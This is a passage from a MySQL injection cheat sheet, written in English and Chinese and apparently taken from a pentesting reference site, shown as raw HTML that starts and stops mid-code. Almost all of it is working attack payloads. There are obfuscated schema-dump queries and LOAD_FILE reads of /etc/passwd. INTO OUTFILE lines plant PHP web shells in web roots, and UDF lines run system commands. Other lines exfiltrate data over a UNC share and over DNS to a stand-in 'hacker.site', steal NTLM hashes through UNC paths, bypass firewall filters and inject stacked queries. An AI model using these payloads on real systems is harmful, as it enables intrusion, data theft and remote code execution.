class="number">0x3c62723e3c666f6e7420636f6c6f723d2223306639643936223e56657273696f6e207e3e3e203c2f666f6e743e</span>,@<span class="variable">@version</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223306637363964223e55736572207e3e3e203c2f666f6e743e</span>,<span class="keyword">user</span><span class="comment">/**N1Z4M**/</span>(),<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223306639643365223e506f7274207e3e3e203c2f666f6e743e</span>,@<span class="variable">@port</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223346435613733223e4f53207e3e3e203c2f666f6e743e</span>,@<span class="variable">@version</span>_compile_os,<span class="number">0x2c3c62723e3c666f6e7420636f6c6f723d2223366134343732223e44617461204469726563746f7279204c6f636174696f6e207e3e3e203c2f666f6e743e</span>,@<span class="variable">@datadir</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223333130343362223e55554944207e3e3e203c2f666f6e743e</span>,UUID<span class="comment">/**N1Z4M**/</span>(),<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223363930343637223e43757272656e742055736572207e3e3e203c2f666f6e743e</span>,<span class="built_in">current_user</span><span class="comment">/**N1Z4M**/</span>(),<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223383432303831223e54656d70204469726563746f7279207e3e3e203c2f666f6e743e</span>,@<span class="variable">@tmpdir</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223396336623934223e424954532044455441494c53207e3e3e203c2f666f6e743e</span>,@<span class="variable">@version</span>_compile_machine,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223396630613838223e46494c452053595354454d207e3e3e203c2f666f6e743e</span>,@<span class="variable">@CHARACTER</span>_SET_FILESYSTEM,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223393234323564223e486f7374204e616d65207e3e3e203c2f666f6e743e</span>,@<span class="variable">@hostname</span>,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223393430313333223e53797374656d2055554944204b6579207e3e3e203c2f666f6e743e</span>,UUID<span class="comment">/**N1Z4M**/</span>(),<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223613332363531223e53796d4c696e6b20207e3e3e203c2f666f6e743e</span>,@<span class="variable">@GLOBAL</span>.have_symlink,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223353830633139223e53534c207e3e3e203c2f666f6e743e</span>,@<span class="variable">@GLOBAL</span>.have_ssl,<span class="number">0x3c62723e3c666f6e7420636f6c6f723d2223393931663333223e42617365204469726563746f7279207e3e3e203c2f666f6e743e</span>,@<span class="variable">@basedir</span>,<span class="number">0x3c62723e3c2f616464726573733e3c62723e3c666f6e7420636f6c6f723d22626c7565223e</span>,(<span class="comment">/*!13337select*/</span>(<span class="variable">@a</span>)<span class="comment">/*!13337from*/</span>(<span class="comment">/*!13337select*/</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="number">0x00</span>),(<span class="comment">/*!13337select*/</span>(<span class="variable">@a</span>)<span class="comment">/*!13337from*/</span>(information_schema.columns)<span class="comment">/*!13337where*/</span>(table_schema<span class="operator">!=</span><span class="number">0x696e666f726d6174696f6e5f736368656d61</span>)<span class="keyword">and</span>(<span class="variable">@a</span>)<span class="keyword">in</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="comment">/*!13337concat*/</span>(<span class="variable">@a</span>,table_schema,<span class="number">0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e</span>,table_name,<span class="number">0x3c666f6e7420636f6c6f723d22726564223e20203a3a203c2f666f6e743e</span>,column_name,<span class="number">0x3c62723e</span>))))a))<span class="operator">+</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- sharik</span></span><br><span class="line">(<span class="keyword">select</span>(<span class="variable">@a</span>)<span class="keyword">from</span>(<span class="keyword">select</span>(<span class="variable">@a</span>:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span>(<span class="variable">@a</span>)<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_schema<span class="operator">!=</span><span class="number">0x696e666f726d6174696f6e5f736368656d61</span>)<span class="keyword">and</span>(<span class="variable">@a</span>)<span class="keyword">in</span>(<span class="variable">@a</span>:<span class="operator">=</span>concat(<span class="variable">@a</span>,table_name,<span class="number">0x203a3a20</span>,column_name,<span class="number">0x3c62723e</span>))))a)</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-Current-queries"><a href="#MYSQL-Current-queries" class="headerlink" title="MYSQL Current queries"></a>MYSQL Current queries</h2><p>This table can list all operations that DB is performing at the moment.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="number">1</span>,state,info,<span class="number">4</span> <span class="keyword">FROM</span> INFORMATION_SCHEMA.PROCESSLIST #</span><br><span class="line"></span><br><span class="line"><span class="comment">-- Dump in one shot example for the table content.</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span>(@)<span class="keyword">from</span>(<span class="keyword">select</span>(@:<span class="operator">=</span><span class="number">0x00</span>),(<span class="keyword">select</span>(@)<span class="keyword">from</span>(information_schema.processlist)<span class="keyword">where</span>(@)<span class="keyword">in</span>(@:<span class="operator">=</span>concat(@,<span class="number">0x3C62723E</span>,state,<span class="number">0x3a</span>,</span><br></pre></td></tr></table></figure>

<h2 id="MYSQL-Read-content-of-a-file"><a href="#MYSQL-Read-content-of-a-file" class="headerlink" title="MYSQL Read content of a file"></a>MYSQL Read content of a file</h2><p>Need the filepriv, otherwise you will get the error : ERROR 1290 (HY000): The MySQL server is running with the –secure-file-priv option so it cannot execute this statement</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; UNION ALL SELECT LOAD_FILE(&#x27;</span><span class="operator">/</span>etc<span class="operator">/</span>passwd<span class="string">&#x27;) --</span></span><br><span class="line"><span class="string">UNION ALL SELECT TO_base64(LOAD_FILE(&#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>index.php<span class="string">&#x27;));</span></span><br></pre></td></tr></table></figure>
<p>If you are root on the database, you can re-enable the LOAD_FILE using the following query</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GRANT</span> FILE <span class="keyword">ON</span> <span class="operator">*</span>.<span class="operator">*</span> <span class="keyword">TO</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>; FLUSH PRIVILEGES;#</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-Write-a-shell"><a href="#MYSQL-Write-a-shell" class="headerlink" title="MYSQL Write a shell"></a>MYSQL Write a shell</h2><h3 id="Into-outfile-method"><a href="#Into-outfile-method" class="headerlink" title="Into outfile method"></a>Into outfile method</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> &quot;&lt;?php system($_GET[&#x27;cmd&#x27;]); ?&gt;&quot; <span class="keyword">into</span> outfile &quot;C:\\xampp\\htdocs\\backdoor.php&quot;</span><br><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/x.php&#x27;</span> FIELDS TERMINATED <span class="keyword">BY</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span></span><br><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">0x3c3f70687020706870696e666f28293b203f3e</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:\\wamp\\www\\pwnd.php&#x27;</span><span class="comment">-- -</span></span><br><span class="line">[...] <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,&quot;&lt;?php echo shell_exec($_GET[&#x27;cmd&#x27;]);?&gt;&quot;,<span class="number">6</span> <span class="keyword">into</span> OUTFILE <span class="string">&#x27;c:/inetpub/wwwroot/backdoor.php&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="Into-dumpfile-method"><a href="#Into-dumpfile-method" class="headerlink" title="Into dumpfile method"></a>Into dumpfile method</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">0</span>xPHP_PAYLOAD_IN_HEX, <span class="keyword">NULL</span>, <span class="keyword">NULL</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;C:/Program Files/EasyPHP-12.1/www/shell.php&#x27;</span></span><br><span class="line">[...] <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">0x3c3f7068702073797374656d28245f4745545b2763275d293b203f3e</span> <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/var/www/html/images/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h2 id="MYSQL-Fast-Exploitation"><a href="#MYSQL-Fast-Exploitation" class="headerlink" title="MYSQL Fast Exploitation"></a>MYSQL Fast Exploitation</h2><p>Requirement: MySQL &gt;&#x3D; 5.7.22</p>
<p>Use json_arrayagg() instead of group_concat() which allows less symbols to be displayed</p>
<ul>
<li>group_concat() &#x3D; 1024 symbols</li>
<li>json_arrayagg() &gt; 16,000,000 symbols<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">json_arrayagg</span>(concat_ws(<span class="number">0x3a</span>,table_schema,table_name)) <span class="keyword">from</span> INFORMATION_SCHEMA.TABLES;</span><br></pre></td></tr></table></figure>
<h2 id="MYSQL-UDF-command-execution"><a href="#MYSQL-UDF-command-execution" class="headerlink" title="MYSQL UDF command execution"></a>MYSQL UDF command execution</h2>First you need to check if the UDF are installed on the server.</li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ whereis lib_mysqludf_sys.so</span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>lib_mysqludf_sys.so</span><br></pre></td></tr></table></figure>
<p>Then you can use functions such as sys_exec and sys_eval.</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ mysql <span class="operator">-</span>u root <span class="operator">-</span>p mysql</span><br><span class="line">Enter password: [...]</span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">SELECT</span> sys_eval(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> sys_eval(<span class="string">&#x27;id&#x27;</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> uid<span class="operator">=</span><span class="number">118</span>(mysql) gid<span class="operator">=</span><span class="number">128</span>(mysql) <span class="keyword">groups</span><span class="operator">=</span><span class="number">128</span>(mysql) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------------------------------------+</span></span><br></pre></td></tr></table></figure>
<h1 id="MYSQL-Out-of-band"><a href="#MYSQL-Out-of-band" class="headerlink" title="MYSQL Out of band"></a>MYSQL Out of band</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> @<span class="variable">@version</span> <span class="keyword">into</span> outfile <span class="string">&#x27;\\\\192.168.0.100\\temp\\out.txt&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@version</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;\\\\192.168.0.100\\temp\\out.txt</span></span><br></pre></td></tr></table></figure>
<h3 id="DNS-exfiltration"><a href="#DNS-exfiltration" class="headerlink" title="DNS exfiltration"></a>DNS exfiltration</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>,version(),<span class="string">&#x27;.hacker.site\\a.txt&#x27;</span>));</span><br><span class="line"><span class="keyword">select</span> load_file(concat(<span class="number">0x5c5c5c5c</span>,version(),<span class="number">0x2e6861636b65722e736974655c5c612e747874</span>))</span><br></pre></td></tr></table></figure>
<h3 id="UNC-Path-NTLM-hash-stealing"><a href="#UNC-Path-NTLM-hash-stealing" class="headerlink" title="UNC Path - NTLM hash stealing"></a>UNC Path - NTLM hash stealing</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;\\\\error\\abc&#x27;</span>);</span><br><span class="line"><span class="keyword">select</span> load_file(<span class="number">0x5c5c5c5c6572726f725c5c616263</span>);</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;osanda&#x27;</span> <span class="keyword">into</span> dumpfile <span class="string">&#x27;\\\\error\\abc&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">&#x27;osanda&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;\\\\error\\abc&#x27;</span>;</span><br><span class="line">load data infile <span class="string">&#x27;\\\\error\\abc&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> database.table_name;</span><br></pre></td></tr></table></figure>

<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p><strong>Learn here different options to</strong> <a href="mysql-ssrf.md"><strong>abuse a Mysql injection to obtain a SSRF</strong></a><strong>.</strong></p>
<h2 id="WAF-bypass-tricks"><a href="#WAF-bypass-tricks" class="headerlink" title="WAF bypass tricks"></a>WAF bypass tricks</h2><h3 id="Information-schema-alternatives"><a href="#Information-schema-alternatives" class="headerlink" title="Information_schema alternatives"></a>Information_schema alternatives</h3><p>Remember that in “modern” versions of <strong>MySQL</strong> you can substitute <em><strong>information_schema.tables</strong></em> for <em><strong>mysql.innodb_table_stats</strong></em>** ** or for <em><strong>sys.x$schema_flattened_keys</strong></em> or for <strong>sys.schema_table_statistics</strong></p>
<p><img src="/../../../.gitbook/assets/image%20(154).png"></p>
<p><img src="/../../../.gitbook/assets/image%20(155).png"></p>
<h3 id="MySQLinjection-without-COMMAS"><a href="#MySQLinjection-without-COMMAS" class="headerlink" title="MySQLinjection without COMMAS"></a>MySQLinjection without COMMAS</h3><p>Select 2 columns without using any comma (<a target="_blank" rel="noopener" href="https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma">https://security.stackexchange.com/questions/118332/how-make-sql-select-query-without-comma</a>):</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select * from (select 1)UT1 JOIN (SELECT table_name FROM mysql.innodb_table_stats)UT2 on 1=1#</span><br></pre></td></tr></table></figure>

<p>使用 OFFSET、FROM 和 JOIN 绕过</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LIMIT <span class="number">0</span>,<span class="number">1</span>         <span class="operator">-</span><span class="operator">&gt;</span> LIMIT <span class="number">1</span> <span class="keyword">OFFSET</span> <span class="number">0</span></span><br><span class="line">SUBSTR(<span class="string">&#x27;SQL&#x27;</span>,<span class="number">1</span>,<span class="number">1</span>) <span class="operator">-</span><span class="operator">&gt;</span> SUBSTR(<span class="string">&#x27;SQL&#x27;</span> <span class="keyword">FROM</span> <span class="number">1</span> <span class="keyword">FOR</span> <span class="number">1</span>).</span><br><span class="line"><span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>    <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span>)a <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">2</span>)b <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">3</span>)c <span class="keyword">JOIN</span> (<span class="keyword">SELECT</span> <span class="number">4</span>)d</span><br></pre></td></tr></table></figure>

<p><code>IF</code> 语句中等号被过滤</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">case</span> <span class="keyword">when</span></span><br><span class="line"><span class="keyword">select</span> password <span class="keyword">from</span> finecms.fn_member <span class="keyword">where</span> uid <span class="operator">=</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="keyword">then</span> <span class="number">1</span> <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">end</span>; </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> +----------------------------------+</span></span><br><span class="line"><span class="comment">  | password                         |</span></span><br><span class="line"><span class="comment">  +----------------------------------+</span></span><br><span class="line"><span class="comment">  | ac7cd59472be180b81c7551b92925f03 |</span></span><br><span class="line"><span class="comment">  +----------------------------------+</span></span><br><span class="line"><span class="comment">*/</span> </span><br></pre></td></tr></table></figure>

<h3 id="Extract-columns-name-without-information-schema"><a href="#Extract-columns-name-without-information-schema" class="headerlink" title="Extract columns name without information_schema"></a>Extract columns name without information_schema</h3><p><strong>Method for MySQL &gt;&#x3D; 4.1.</strong></p>
<p>First extract the column number with</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span>(<span class="number">1</span>)<span class="keyword">and</span>(<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> db.users)<span class="operator">=</span>(<span class="number">1</span>)</span><br><span class="line"><span class="comment">-- Operand should contain 4 column(s)</span></span><br></pre></td></tr></table></figure>
<p><strong>Then extract the column name.</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>) <span class="operator">=</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">from</span> db.users <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> LIMIT <span class="number">1</span>)</span><br><span class="line"><span class="comment">--Column &#x27;id&#x27; cannot be null</span></span><br></pre></td></tr></table></figure>

<p>Method for MySQL 5</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#同表相加查询，由于字段重复，会导致报错泄露字段名，同时通过 <span class="keyword">using</span> 函数可忽略联表查询中相同的字段，从而可通过该方式结合MySQL报错信息一个接一个泄露字段名</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">JOIN</span> users b)a</span><br><span class="line"><span class="comment">--#1060 - Duplicate column name &#x27;id&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">JOIN</span> users b <span class="keyword">USING</span>(id))a</span><br><span class="line"><span class="comment">-- #1060 - Duplicate column name &#x27;name&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">JOIN</span> users b <span class="keyword">USING</span>(id,name))a</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="Retrieving-values-without-the-column-name"><a href="#Retrieving-values-without-the-column-name" class="headerlink" title="Retrieving values without the column name"></a>Retrieving values without the column name</h3><p>If at some point you know the name of the table but you don’t know the name of the columns inside the table, you can try to find how may columns are there executing something like:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># When a True is returned, you have found the number of columns</span></span><br><span class="line">select (select <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>) = (SELECT * from demo <span class="built_in">limit</span> 1);     <span class="comment"># 2columns</span></span><br><span class="line">select (select <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>) &lt; (SELECT * from demo <span class="built_in">limit</span> 1); <span class="comment"># 3columns</span></span><br></pre></td></tr></table></figure>

<p>Supposing there is 2 columns (being the first one the ID) and the other one the flag, you can try to bruteforce the content of the flag trying character by character:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># When True, you found the correct char and can start ruteforcing the next position</span></span><br><span class="line">select (select 1, <span class="string">&#x27;flaf&#x27;</span>) = (SELECT * from demo <span class="built_in">limit</span> 1);</span><br></pre></td></tr></table></figure>

<p>其他获取字段值的方式</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 这是一个包含 <span class="number">3</span> 列的<span class="keyword">sql</span>注入示例，将提取 dome 表的第三个字段,第一行的值</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> , F<span class="number">.3</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span> , <span class="number">2</span> , <span class="number">3</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> demo limit <span class="number">1</span>,<span class="number">2</span>)F;</span><br><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">0</span> , <span class="number">0</span> , <span class="number">0</span> ,`<span class="number">3</span>` <span class="keyword">FROM</span> ( <span class="keyword">SELECT</span> <span class="number">1</span> , <span class="number">2</span> , <span class="number">3</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> demo limit <span class="number">1</span>,<span class="number">2</span>) F;</span><br><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> a<span class="number">.2</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> <span class="number">1</span> , <span class="number">2</span> , <span class="number">3</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> runoob_tbl)a limit <span class="number">1</span>,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>

<p>或者如果目标系统支持堆叠注入，可以通过使用以下方式绕过限制（<code>column</code> ，<code>_</code> ， <code>information</code>，<code>select</code> 等）：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">78.46</span><span class="number">.224</span><span class="number">.75</span><span class="operator">/</span>quote<span class="operator">/</span><span class="number">2</span>;<span class="keyword">SET</span><span class="operator">%</span><span class="number">0</span>D<span class="variable">@sql</span><span class="operator">%</span><span class="number">3</span>d0x444f20736c656570283529;<span class="keyword">PREPARE</span><span class="operator">%</span><span class="number">0</span>Dquery<span class="operator">%</span><span class="number">0</span>DFROM<span class="operator">%</span><span class="number">0</span>D<span class="variable">@sql</span>;<span class="keyword">EXECUTE</span><span class="operator">%</span><span class="number">0</span>Dquery</span><br><span class="line"></span><br><span class="line"># <span class="keyword">SQL</span>语句原型：</span><br><span class="line"><span class="keyword">set</span> <span class="variable">@sql</span> <span class="operator">=</span> <span class="number">0x444f20736c656570283529</span>; # DO sleep(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">PREPARE</span> query <span class="keyword">FROM</span> <span class="variable">@sql</span>;</span><br><span class="line"><span class="keyword">EXECUTE</span> query;</span><br></pre></td></tr></table></figure>

<p>More info in <a target="_blank" rel="noopener" href="https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952">https:&#x2F;&#x2F;medium.com&#x2F;@terjanq&#x2F;blind-sql-injection-without-an-in-1e14ba1d4952</a></p>
<h3 id="通用绕过"><a href="#通用绕过" class="headerlink" title="通用绕过"></a>通用绕过</h3><p><strong>大写&#x2F;小写绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AND</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">AnD</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">aNd</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>#</span><br></pre></td></tr></table></figure>

<p><strong>等效运算符绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">AND</span>   <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">&amp;&amp;</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">%</span><span class="number">26</span><span class="operator">%</span><span class="number">26</span></span><br><span class="line"><span class="keyword">OR</span>    <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">||</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="operator">%</span><span class="number">7</span>C<span class="operator">%</span><span class="number">7</span>C</span><br><span class="line"><span class="operator">=</span>     <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">LIKE</span>,REGEXP,RLIKE, <span class="keyword">not</span> <span class="operator">&lt;</span> <span class="keyword">and</span> <span class="keyword">not</span> <span class="operator">&gt;</span></span><br><span class="line"><span class="operator">&gt;</span> X   <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">not</span> <span class="keyword">between</span> <span class="number">0</span> <span class="keyword">and</span> X</span><br><span class="line"><span class="keyword">WHERE</span> <span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">HAVING</span> <span class="comment">--&gt; LIMIT X,1 -&gt; group_concat(CASE(table_schema)When(database())Then(table_name)END) -&gt; group_concat(if(table_schema=database(),table_name,null))</span></span><br></pre></td></tr></table></figure>
<p><strong><code>select x</code> 绕过</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"># [<span class="operator">+</span>]</span><br><span class="line"><span class="keyword">select</span><span class="operator">+</span>x <span class="keyword">from</span> y</span><br><span class="line"></span><br><span class="line"># [<span class="operator">-</span>]</span><br><span class="line"><span class="keyword">select</span><span class="operator">-</span>x <span class="keyword">from</span> y</span><br><span class="line"></span><br><span class="line"># [@]</span><br><span 